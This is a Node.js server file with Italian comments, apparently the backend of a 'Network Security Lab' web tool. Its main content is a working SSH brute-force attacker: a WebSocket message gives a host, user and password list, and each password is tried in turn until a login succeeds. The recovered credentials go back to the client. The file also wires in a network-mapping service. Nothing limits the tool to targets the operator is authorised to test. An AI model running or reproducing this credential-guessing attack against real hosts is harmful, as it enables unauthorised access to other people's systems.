// src/server.js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const config = require('./config');
const apiRoutes = require('./api/routes');
const errorHandler = require('./api/middleware/errorHandler');

// Nuove importazioni per il server SSH
const WebSocket = require('ws');
const { Client } = require('ssh2');
const fs = require('fs');
const crypto = require('crypto');

// Import per la mappatura di rete
const { performAdvancedNetworkMapping } = require('./core/services/networkMapperService');


// =============================================================================
// SERVER EXPRESS ESISTENTE
// =============================================================================
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

app.get('/test', (req, res) => {
  res.json({ message: 'Il server di test funziona correttamente!' });
});

app.use('/api/v1', apiRoutes);

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public', 'index.html'));
});

app.use((req, res, next) => {
  res.status(404).json({ error: `Endpoint non trovato: ${req.method} ${req.originalUrl}` });
});
app.use(errorHandler);


// =============================================================================
// CLASSI PER IL TOOL SSH (INVARIATE)
// =============================================================================
class AuditLogger {
    constructor() {
        if (!fs.existsSync(config.ssh_tool.log_dir)) {
            fs.mkdirSync(config.ssh_tool.log_dir, { recursive: true });
        }
    }
    logEvent(event) {
        const logEntry = { timestamp: new Date().toISOString(), ...event };
        const logString = JSON.stringify(logEntry) + '\n';
        fs.appendFileSync(config.ssh_tool.audit_log_path, logString);
        if (event.level === 'error') {
            fs.appendFileSync(config.ssh_tool.error_log_path, logString);
        }
    }
}

class SSHErrorAnalyzer {
    static classify(err) {
        const errorMap = {
            'All configured authentication methods failed': 'Credenziali errate',
            'Connection timed out': 'Timeout connessione',
            'Handshake failed': 'Handshake fallito',
            'ECONNREFUSED': 'Connessione rifiutata'
        };
        for (const [pattern, message] of Object.entries(errorMap)) {
            if (err.message.includes(pattern)) return message;
        }
        return `Errore sconosciuto: ${err.message}`;
    }
}

class SSHConnectionManager {
    constructor(logger) {
        this.logger = logger;
        this.activeConnections = new Set();
    }
    async testCredentials(host, port, username, password) {
        if (this.activeConnections.size >= config.ssh_tool.max_concurrent_connections) {
            throw new Error('Troppe connessioni contemporanee');
        }
        const connectionId = crypto.randomUUID();
        this.activeConnections.add(connectionId);
        try {
            return await this._attemptConnection(host, port, username, password);
        } finally {
            this.activeConnections.delete(connectionId);
        }
    }
    _attemptConnection(host, port, username, password) {
        return new Promise((resolve) => {
            const conn = new Client();
            let resolved = false;
            const timeout = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    conn.end();
                    resolve({ success: false, error: 'Timeout connessione' });
                }
            }, config.ssh_tool.connection_timeout);
            conn.on('ready', () => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                this.logger.logEvent({ level: 'success', event: 'SSH_SUCCESS', target: `${username}@${host}` });
                conn.exec('whoami', (err, stream) => {
                    if (err) {
                        conn.end();
                        return resolve({ success: false, error: 'Verifica post-login fallita' });
                    }
                    stream.on('close', () => {
                        conn.end();
                        resolve({ success: true });
                    }).on('data', () => {});
                });
            });
            conn.on('error', (err) => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const errorMsg = SSHErrorAnalyzer.classify(err);
                this.logger.logEvent({ level: 'error', event: 'SSH_FAILURE', target: `${username}@${host}`, error: errorMsg });
                conn.end();
                resolve({ success: false, error: errorMsg });
            });
            conn.connect({
                host, port, username, password,
                readyTimeout: config.ssh_tool.connection_timeout - 1000,
                algorithms: config.ssh_tool.algorithms,
                tryKeyboard: true
            });
        });
    }
}

class AttackSession {
    constructor(ws, logger) {
        this.ws = ws;
        this.logger = logger;
        this.sshManager = new SSHConnectionManager(logger);
        this.isActive = false;
    }
    async start({ host, port, user, passwords }) {
        if (this.isActive) { this._sendMessage('error', 'Un attacco è già in corso.'); return; }
        const targetUser = user;
        if (!targetUser || !host || !passwords || !Array.isArray(passwords)) { this._sendMessage('error', 'Parametri mancanti o non validi.'); return; }
        this.isActive = true;
        const targetPort = port || 22;
        this._sendMessage('info', `Inizio attacco su ${targetUser}@${host}:${targetPort}`);
        let found = false;
        const total = passwords.length;
        for (let i = 0; i < total && this.isActive; i++) {
            const password = passwords[i];
            this._sendProgress(i + 1, total);
            try {
                this._sendMessage('attack', `Tentativo con -> ${targetUser}:${'*'.repeat(password.length)}`);
                const result = await this.sshManager.testCredentials(host, targetPort, targetUser, password);
                if (result.success) {
                    found = true;
                    this._sendResult(targetUser, password);
                    break;
                } else { this._sendMessage('error', `${result.error}`); }
            } catch (err) { this._sendMessage('error', `Errore critico: ${err.message}`); }
            await new Promise(resolve => setTimeout(resolve, config.ssh_tool.rate_limit_delay));
        }
        if (!found && this.isActive) {
            this._sendMessage('info', 'Attacco completato - Nessuna password trovata');
            this._send('finished', {});
        }
        this.logger.logEvent({ event: 'ATTACK_COMPLETE', target: `${targetUser}@${host}:${targetPort}`, success: found });
        this.isActive = false;
    }
    stop() {
        this.isActive = false;
        this._sendMessage('warning', 'Attacco interrotto manualmente');
    }
    _send(type, data) { if (this.ws.readyState === WebSocket.OPEN) { this.ws.send(JSON.stringify({ type, ...data })); } }
    _sendMessage(level, message) { this._send('log', { level, message }); }
    _sendProgress(current, total) { this._send('progress', { current, total }); }
    _sendResult(username, password) { this._send('found', { username, password }); }
}

// =============================================================================
// AVVIO DEL SERVER EXPRESS E DEL SERVER WEBSOCKET
// =============================================================================
if (!fs.existsSync(path.join(__dirname, config.ssh_tool.log_dir))) {
    fs.mkdirSync(path.join(__dirname, config.ssh_tool.log_dir), { recursive: true });
}

const expressServer = app.listen(config.port, () => {
  console.log(`🚀 Network Security Lab Server v4.0 in ascolto su http://localhost:${config.port}`);
  console.log(`🔧 API disponibili su http://localhost:${config.port}/api/v1`);
  console.log(`📱 Apri http://localhost:${config.port}/ per usare l'interfaccia principale.`);
});

// Avvio il server WebSocket sulla porta dedicata
const wss = new WebSocket.Server({ port: config.ssh_tool.port });
const sshLogger = new AuditLogger();

console.log(`⚡ Real-time Server (v9.0 - WebSocket) running on port ${config.ssh_tool.port}`);
sshLogger.logEvent({ event: 'SERVER_START' });

wss.on('connection', (ws) => {
    const clientIp = ws._socket.remoteAddress;
    console.log(`🔌 New client connected via WebSocket: ${clientIp}`);
    
    let activeSshSession = null;

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            console.log('Messaggio ricevuto dal frontend via WebSocket:', message);

            // GESTIONE MESSAGGI MULTI-TIPO
            switch (message.type) {
                case 'start_attack':
                    // La logica per l'attacco SSH rimane qui
                    sshLogger.logEvent({ event: 'CLIENT_CONNECT', clientIp });
                    activeSshSession = new AttackSession(ws, sshLogger);
                    ws.send(JSON.stringify({ type: 'log', level: 'success', message: 'Connessione al backend SSH stabilita.'}));
                    activeSshSession.start(message);
                    break;

                case 'stop_attack':
                    if (activeSshSession) activeSshSession.stop();
                    break;
                
                case 'start_network_map':
                    // Funzione di callback per inviare progressi
                    const progressCallback = (progressData) => {
                        if (ws.readyState === WebSocket.OPEN) {
                           ws.send(JSON.stringify({ type: 'network_map_progress', ...progressData }));
                        }
                    };
                    
                    try {
                        // Passa la callback alla funzione di mappatura
                        const results = await performAdvancedNetworkMapping(message.network, message.options, progressCallback);
                        // Invia i risultati finali
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({ type: 'network_map_result', status: 'completed', data: results }));
                        }
                    } catch (error) {
                        if (ws.readyState === WebSocket.OPEN) {
                           ws.send(JSON.stringify({ type: 'network_map_result', status: 'error', message: error.message }));
                        }
                    }
                    break;
            }

        } catch (err) {
            console.error('Errore parsing messaggio WebSocket:', err);
        }
    });

    ws.on('close', () => {
        console.log(`❌ Client disconnected from WebSocket: ${clientIp}`);
        if (activeSshSession) {
            sshLogger.logEvent({ event: 'CLIENT_DISCONNECT', clientIp });
            activeSshSession.stop();
        }
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
         if (activeSshSession) {
            sshLogger.logEvent({ event: 'WEBSOCKET_SSH_ERROR', clientIp, error: err.message });
         }
    });
});